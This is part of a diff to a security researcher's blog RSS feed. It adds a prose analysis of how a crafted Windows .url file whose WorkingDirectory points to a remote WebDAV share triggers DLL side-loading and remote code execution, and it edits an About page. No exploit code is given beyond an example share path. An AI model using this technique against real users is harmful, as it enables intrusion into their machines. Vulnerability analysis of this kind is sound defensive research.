+&lt;p>When a user interacts with a &lt;code>.url&lt;/code> file in Windows, a series of internal processes are triggered that can be leveraged to execute code from a remote location, such as a WebDAV share. This analysis breaks down the internal mechanisms of Windows that enable this, focusing on the WorkingDirectory parameter and the role of WebDAV in loading executables.&lt;/p>
+&lt;h3 id="the-execution-flow-of-a-url-file" >
+&lt;div>
+&lt;a href="#the-execution-flow-of-a-url-file">
+##
+&lt;/a>
+The Execution Flow of a .url File
+&lt;/div>
+&lt;/h3>
+&lt;p>The process begins when a user double-clicks a &lt;code>.url&lt;/code> file. This action is handled by the Windows Shell, which uses the &lt;code>ShellExecute&lt;/code> or &lt;code>ShellExecuteEx&lt;/code> API functions from the &lt;code>shell32.dll&lt;/code> library to process the file. &lt;code>ShellExecuteEx&lt;/code> is a versatile function that can open or perform actions on any file type by identifying the default handler registered for that file&amp;rsquo;s extension in the Windows Registry. For &lt;code>.url&lt;/code> files, the registered handler is typically the Internet Shortcut file type. The shell then parses the contents of the &lt;code>.url&lt;/code> file, which is a plain text file containing sections and key-value pairs. A specially crafted &lt;code>.url&lt;/code> file can be used to launch a local executable instead of opening a web page.&lt;/p>
+&lt;h3 id="the-role-of-shellexecuteex-and-createprocessw" >
+&lt;div>
+&lt;a href="#the-role-of-shellexecuteex-and-createprocessw">
+##
+&lt;/a>
+The Role of ShellExecuteEx and CreateProcessW
+&lt;/div>
+&lt;/h3>
+&lt;p>The &lt;code>ShellExecuteEx&lt;/code> function uses a &lt;code>SHELLEXECUTEINFO&lt;/code> structure to manage the execution. Key members of this structure in this context are:&lt;/p>
+&lt;pre tabindex="0">&lt;code>lpFile: The path to the .url file itself.
+lpDirectory: This sets the working directory for the new process.
+nShow: Controls how the application&amp;#39;s window is displayed (e.g., minimized, hidden).
+&lt;/code>&lt;/pre>&lt;p>&lt;code>ShellExecuteEx&lt;/code> ultimately calls the &lt;code>CreateProcessW&lt;/code> function to create a new process. &lt;code>CreateProcessW&lt;/code> provides more granular control over the new process&amp;rsquo;s creation. The parameters from the &lt;code>.url&lt;/code> file and the &lt;code>SHELLEXECUTEINFO&lt;/code> structure are passed to &lt;code>CreateProcessW&lt;/code>.&lt;/p>
+&lt;h3 id="the-significance-of-the-workingdirectory-parameter" >
+&lt;div>
+&lt;a href="#the-significance-of-the-workingdirectory-parameter">
+##
+&lt;/a>
+The Significance of the WorkingDirectory Parameter
+&lt;/div>
+&lt;/h3>
+&lt;p>The &lt;code>WorkingDirectory&lt;/code> parameter within the &lt;code>[InternetShortcut]&lt;/code> section of the &lt;code>.url&lt;/code> file is crucial in this process. When the Windows Shell parses the &lt;code>.url&lt;/code> file, it reads the value of &lt;code>WorkingDirectory&lt;/code> and uses it to populate the &lt;code>lpDirectory&lt;/code> member of the &lt;code>SHELLEXECUTEINFO&lt;/code> structure. This value is then passed to the &lt;code>lpCurrentDirectory&lt;/code> parameter of the &lt;code>CreateProcessW&lt;/code> function. By setting the &lt;code>WorkingDirectory&lt;/code> to a remote WebDAV share (e.g., &lt;code>\\192.168.10.10\webdav&lt;/code>), an attacker can control the current directory of the newly created process. This has significant implications for how Windows loads required libraries.&lt;/p>
+&lt;h3 id="windows-dll-search-order-and-side-loading" >
+&lt;div>
+&lt;a href="#windows-dll-search-order-and-side-loading">
+##
+&lt;/a>
+Windows DLL Search Order and Side-Loading
+&lt;/div>
+&lt;/h3>
+&lt;p>When a Windows application starts, it loads necessary Dynamic-Link Libraries (DLLs). The operating system searches for these DLLs in a specific order:&lt;/p>
+&lt;p>&amp;ndash; The directory from which the application is loaded.&lt;/p>
+&lt;p>&amp;ndash; The current directory for the process.&lt;/p>
+&lt;p>&amp;ndash; The 32-bit Windows system directory (typically &lt;code>C:\Windows\System32&lt;/code>).&lt;/p>
+&lt;p>&amp;ndash; The 16-bit Windows system directory.&lt;/p>
+&lt;p>&amp;ndash; The Windows directory (typically &lt;code>C:\Windows&lt;/code>).&lt;/p>
+&lt;p>&amp;ndash; The directories listed in the &lt;code>PATH&lt;/code> environment variable.&lt;/p>
+&lt;p>The &lt;code>WorkingDirectory&lt;/code> parameter directly influences the second step in this search order. By setting the current directory to a remote WebDAV share, an attacker can place a malicious DLL on that share with the same name as a legitimate DLL required by the application. When the application attempts to load the DLL, it will find and load the malicious version from the WebDAV share before it finds the legitimate version in the system directories. This is known as &lt;strong>DLL side-loading&lt;/strong>.&lt;/p>
+&lt;h3 id="webdav-and-remote-execution" >
+&lt;div>
+&lt;a href="#webdav-and-remote-execution">
+##
+&lt;/a>
+WebDAV and Remote Execution
+&lt;/div>
+&lt;/h3>
+&lt;p>The ability to load an executable or DLL from a WebDAV share as if it were on the local filesystem is facilitated by the &lt;code>WebClient&lt;/code> service in Windows. The &lt;code>WebClient&lt;/code> service allows Windows to access files on the internet using the &lt;code>WebDAV&lt;/code> protocol. It runs within a &lt;code>svchost.exe&lt;/code> process and relies on other services like &lt;code>MRxDAV&lt;/code> (the WebDAV redirector). When an application, with its working directory set to a WebDAV share, requests to load a DLL, the WebClient service handles the request, retrieving the file from the remote server and providing it to the application&amp;rsquo;s process. This allows the malicious DLL to be loaded into the memory of the legitimate process, effectively executing the attacker&amp;rsquo;s code in the context of a trusted application&lt;/p>
+&lt;h2 id="references" >
+&lt;div>
+&lt;a href="#references">
+#
+&lt;/a>
+References:
+&lt;/div>
+&lt;/h2>
+&lt;ol>
+&lt;li>&lt;a href="https://winbindex.m417z.com/">Windows Binary Index&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://research.checkpoint.com/2025/stealth-falcon-zero-day/">CheckPoint Research - Stealth Falcon 0-day&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.kaspersky.co.in/blog/cve-2025-33053-june-2025-patch-tuesday/28949/">Kaspersky Blogs on CVE-2025-33053&lt;/a>&lt;/li>
+&lt;/ol></description></item><item><title>Peculiar Pentest Scenes - Client-side HTTP Encryption Folly</title><link>/blog/peculiar_pentest_scenes_1/</link><pubDate>Sun, 06 Oct 2024 00:00:00 +0000</pubDate><author>arkaprabhachakraborty2001@gmail.com (Arkaprabha Chakraborty)</author><guid>/blog/peculiar_pentest_scenes_1/</guid><description>&lt;p>Hello fellow researcher! Welcome to the &lt;em>&lt;strong>Chapter 1&lt;/strong>&lt;/em> of &lt;em>&lt;strong>Peculiar Pentest Scenes&lt;/strong>&lt;/em> series of blogs, where I take you through weird situations that I have encountered while being in different penetration testing engagements. In this post, I&amp;rsquo;m going to take you through &lt;strong>Client-side HTTP Encryption&lt;/strong> and it&amp;rsquo;s nuances, how easy it can be to exploit web and mobile applications implementing this &lt;em>feature&lt;/em>, and what are the possible &lt;em>right/correct&lt;/em> ways to do it.&lt;/p>
 &lt;h2 id="what-is-client-side-http-encryption" >
 &lt;div>
 &lt;a href="#what-is-client-side-http-encryption">
@@ -418,12 +741,12 @@ For the first part&lt;/p>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>GITHUB_TOKEN&lt;/code> is a unique token that GitHub automatically creates a unique GITHUB_TOKEN secret to use in your workflow. You can use the GITHUB_TOKEN to authenticate in a workflow run. When you enable GitHub Actions, GitHub installs a GitHub App on your repository. The GITHUB_TOKEN secret is a GitHub App installation access token. You can use the installation access token to authenticate on behalf of the GitHub App installed on your repository.
 For more info see the &lt;a href="https://docs.github.com/en/actions/security-guides/automatic-token-authentication">automatic token authentication&lt;/a>.&lt;/p>
 &lt;p>So in this section we take the &lt;code>public&lt;/code> directory and deploy it to GitHub Pages. After that we trigger github pages deployment.&lt;/p>
-&lt;p>Yep that&amp;rsquo;s it :). Please note that you have to change github pages default branch to gh-pages after your first push. If you enjoyed it then do follow me on twitter and on github :P.&lt;/p></description></item><item><title/><link>/about/</link><pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate><author>arkaprabhachakraborty2001@gmail.com (Arkaprabha Chakraborty)</author><guid>/about/</guid><description>&lt;h2 id="arkaprabha127001-whoami" >
+&lt;p>Yep that&amp;rsquo;s it :). Please note that you have to change github pages default branch to gh-pages after your first push. If you enjoyed it then do follow me on twitter and on github :P.&lt;/p></description></item><item><title/><link>/about/</link><pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate><author>arkaprabhachakraborty2001@gmail.com (Arkaprabha Chakraborty)</author><guid>/about/</guid><description>&lt;h2 id="t1ntin127001-whoami" >
 &lt;div>
-&lt;a href="#arkaprabha127001-whoami">
+&lt;a href="#t1ntin127001-whoami">
 #
 &lt;/a>
-[arkaprabha@127.0.0.1]$ whoami
+[t1ntin@127.0.0.1]$ whoami
 &lt;/div>
 &lt;/h2>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>Welcome to my little corner on the Internet.
@@ -433,7 +756,7 @@ For more info see the &lt;a href="https://docs.github.com/en/actions/security-gu
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">::&lt;/span> Things I &lt;span style="color:#ff6ac1">&amp;lt;&lt;/span>&lt;span style="color:#ff9f43">3&lt;/span>&lt;span style="color:#ff6ac1">:&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">-&lt;/span> Tinkering with OS, Networking and Web applications.
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">-&lt;/span> Containers &lt;span style="color:#ff6ac1">&amp;amp;&lt;/span> Kubernetes.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">-&lt;/span> Exploit Development &lt;span style="color:#ff6ac1">&amp;amp;&lt;/span> Evasion Research.
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">-&lt;/span> Participating in CTFs.
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">-&lt;/span> Writing Blogs.
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">-&lt;/span> Contributing to various FOSS projects regularly.
@@ -446,7 +769,7 @@ Recent achievements 🏆:
 &lt;/div>
 &lt;/h2>
 &lt;ul>
-&lt;li>&lt;a href="https://summerofcode.withgoogle.com/programs/2022/projects/XDtc6Ero">Google Summer of Code 2022 with OWASP ZAP.&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://summerofcode.withgoogle.com/programs/2022/projects/XDtc6Ero">Google Summer of Code 2022 with OWASP ZAP&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;h2 id="h4ck3r-profile" >
 &lt;div>
@@ -457,4 +780,18 @@ H4CK3R Profile:
 &lt;/div>
 &lt;/h2>
 &lt;p>&lt;img src="https://tryhackme-badges.s3.amazonaws.com/Arkaprabha.png" alt="TryHackMe">&lt;/p>
-&lt;p>&lt;img src="https://www.hackthebox.eu/badge/image/484700" alt="HackTheBox">&lt;/p></description></item></channel></rss>
+&lt;p>&lt;img src="https://www.hackthebox.eu/badge/image/484700" alt="HackTheBox">&lt;/p>
+&lt;h2 id="c3rt" >
+&lt;div>
+&lt;a href="#c3rt">
+#
+&lt;/a>
+C3rt$!
+&lt;/div>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://www.linkedin.com/in/arkaprabhachakraborty/details/certifications/1737315304905/single-media-viewer/?profileId=ACoAAC0Vlv4BCjx4CE618yrZRD3DpIeubdx0e5U">MCRTA&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.linkedin.com/in/arkaprabhachakraborty/details/certifications/1732951009966/single-media-viewer/?profileId=ACoAAC0Vlv4BCjx4CE618yrZRD3DpIeubdx0e5U">ICCA&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.linkedin.com/in/arkaprabhachakraborty/details/certifications/1730225108986/single-media-viewer/?profileId=ACoAAC0Vlv4BCjx4CE618yrZRD3DpIeubdx0e5U">eJPT&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.linkedin.com/in/arkaprabhachakraborty/details/certifications/1723128873226/single-media-viewer/?profileId=ACoAAC0Vlv4BCjx4CE618yrZRD3DpIeubdx0e5U">CEH master&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
